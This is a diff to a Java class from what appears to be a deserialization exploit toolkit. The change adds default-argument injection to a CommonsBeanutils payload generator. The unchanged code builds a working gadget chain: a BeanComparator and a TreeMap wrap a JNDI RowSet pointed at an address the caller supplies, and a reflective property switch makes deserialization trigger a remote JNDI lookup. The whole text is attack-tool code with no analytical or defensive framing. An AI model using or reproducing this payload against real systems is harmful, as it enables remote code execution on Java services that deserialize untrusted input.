@@ -36,6 +36,8 @@ import org.apache.commons.beanutils.BeanComparator;
  */
 public class CommonsBeanutils implements Payload {
 
+    private String[] args;
+
     /**
      *
      * @param args
@@ -46,9 +48,17 @@ public class CommonsBeanutils implements Payload {
      */
     @Override
     public Object getPayload(String[] args) throws Exception {
+        if (this.args != null)
+            args = this.args;
         BeanComparator<Object> cmp = new BeanComparator<>("lowestSetBit", Collections.reverseOrder());
         Object trig = JDKUtil.makeTreeMap(JDKUtil.makeJNDIRowSet(args[ 0 ]), cmp);
         Reflections.setFieldValue(cmp, "property", "databaseMetaData");
         return trig;
     }
+
+    @Override
+    public void injectDefaultArgs(String[] args) {
+        this.args = args;
+    }
+
 }
